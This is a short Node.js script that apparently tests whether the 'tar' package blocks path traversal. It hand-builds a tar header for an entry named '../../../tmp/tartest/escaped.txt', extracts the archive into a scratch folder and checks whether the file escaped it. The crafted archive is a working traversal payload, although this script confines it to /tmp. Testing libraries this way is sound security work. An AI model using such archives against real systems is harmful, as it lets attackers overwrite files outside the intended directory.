import { list, extract } from 'tar';
import fs from 'node:fs/promises';

function buildTarWithEntry(name, content) {
  const header = Buffer.alloc(512);
  header.write(name, 0, 'ascii');
  header.write('000644\0', 100, 7, 'ascii');
  header.write('000000\0', 108, 7, 'ascii');
  header.write('000000\0', 116, 7, 'ascii');
  const sizeOctal = content.length.toString(8).padStart(11, '0') + '\0';
  header.write(sizeOctal, 124, 12, 'ascii');
  const mtimeOctal = Math.floor(Date.now() / 1000).toString(8).padStart(11, '0') + '\0';
  header.write(mtimeOctal, 136, 12, 'ascii');
  header.write('        ', 148, 8, 'ascii');
  header.write('0', 156, 1, 'ascii');
  header.write('ustar\0', 257, 6, 'ascii');
  header.write('00', 263, 2, 'ascii');
  let sum = 0;
  for (const b of header) sum += b;
  const checksumStr = sum.toString(8).padStart(6, '0') + '\0 ';
  header.write(checksumStr, 148, 8, 'ascii');
  const contentBuf = Buffer.from(content);
  const padLen = (512 - (contentBuf.length % 512)) % 512;
  const padding = Buffer.alloc(padLen);
  const endBlocks = Buffer.alloc(1024);
  return Buffer.concat([header, contentBuf, padding, endBlocks]);
}

const evilTar = buildTarWithEntry('../../../tmp/tartest/escaped.txt', 'pwned-content');
await fs.writeFile('/tmp/tartest/evil3.tar', evilTar);

console.log('--- listing evil3 ---');
await list({ file: '/tmp/tartest/evil3.tar', onReadEntry: (e) => console.log('entry path:', JSON.stringify(e.path), 'type', e.type) });

const destDir = '/tmp/tartest/evildest3';
await fs.rm(destDir, { recursive: true, force: true });
await fs.mkdir(destDir, { recursive: true });
await fs.rm('/tmp/tartest/escaped.txt', { force: true });

await extract({ file: '/tmp/tartest/evil3.tar', cwd: destDir, onwarn: (code, msg, data) => console.log('WARN', code, msg) });
console.log('dest contents:', await fs.readdir(destDir).catch((e) => e.message));
console.log('escaped file exists at /tmp/tartest/escaped.txt?', await fs.stat('/tmp/tartest/escaped.txt').then(() => true, () => false));
